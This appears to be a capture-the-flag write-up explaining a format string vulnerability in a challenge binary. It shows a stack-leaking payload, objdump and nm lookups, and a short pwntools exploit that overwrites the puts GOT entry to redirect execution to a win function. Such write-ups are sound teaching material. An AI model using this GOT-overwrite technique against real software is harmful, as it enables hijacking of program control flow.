# Challenge `Calling Functions Again` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format String Vulnerability (Arbitrary Write / Control Flow Hijack)
- Where: Where is the vulnerability present
  - In `vuln()` function at `printf(buffer);`. The buffer is fully controlled by user input via `read()` in `main()`.
- Impact: What results of exploiting this vulnerability
  - Allows overwriting GOT entries, redirects execution flow to arbitrary functions which results in arbitrary function execution.

## Steps to reproduce

1. Connect to the challenge service `nc mustard.stt.rnl.tecnico.ulisboa.pt 25197`

2. Inspect the stack layout by sending a stack-leaking payload:
```
AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
---------------
Output:
AAAA.ffffdc5c.0000007f.0804926a.00000000.00000001.f7ffd918.41414141.3830252e.30252e78.252e7838
```
The start of buffer is at stack argument #7.


3. Use binary analysis tools to identify the address of puts@GOT, which will be overwritten:
```
objdump -R 07_call_functions | grep puts
---------------
Output:
0804c018 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

4. Retrieve the address of the win function using symbol resolution tools such as nm.
```
nm 07_call_functions | grep win
---------------
Output:
08049216 T win
```

4. Craft a payload that places the addresses puts+2 and puts on the stack and sues positional format specifiers to write the two half-words of win into `puts@GOT`

Python exploit:
```py
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25197
from pwn import *;
import sys;
win=0x08049216;
puts=0x0804c018;
sys.stdout.buffer.write(
    p32(puts+2)+p32(puts)+
    b"%2044x%7$hn%35346x%8$hn"
)
EOF
```

5. Result: When the program later calls puts, execution is redirected to win, satisfying the challenge condition and printing the flag.